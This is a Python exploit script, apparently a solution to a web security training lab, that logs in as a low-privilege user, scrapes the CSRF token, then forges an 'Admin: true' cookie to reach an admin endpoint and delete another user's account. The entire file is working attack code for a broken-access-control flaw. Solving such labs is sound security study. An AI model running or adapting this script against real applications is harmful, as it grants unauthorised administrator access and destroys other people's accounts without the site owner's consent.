import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

# method which extracts csrf token feom login page
def get_csrf_token(s, login_url):
    r = s.get(login_url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name" : "csrf"})['value']
    return csrf

def broken_access_control(s, url):

    # step 1 : get CSRF from the login page
    login_url = url + '/login'
    csrf_token = get_csrf_token(s, login_url)
    print("csrf_token : ", csrf_token)

    # step 2 : # using given creds and the csfr token, we can login to app.
    login_data = {'csrf' : csrf_token, 'username' : 'wiener', 'password' : 'peter'}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Login successful")

        # retrieve session cookie
        session_cookie = r.cookies.get_dict().get('session')

        # visit the admin panel and delete user carlos
        delete_carlos_url = url + '/admin/delete?username=carlos'
        cookies = {'session': session_cookie, 'Admin' : 'true'}
        r = s.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)

        if r.status_code == 200:
            print("(+) User carlos deleted successfully!")
            sys.exit(-1)
            
        else:
            print("(-) Failed to delete user carlos!")
            sys.exit(-1)

    else:
        print("(-) Login failed")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example : %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    # to persist the session across multiple requests, we will use session object of requests module
    s = requests.Session()  

    url = sys.argv[1]
    print('(+) Starting the Exploit : Broken Access Control - User role controlled by request parameter \n')    
    broken_access_control(s, url)


if  __name__ == "__main__":
    main()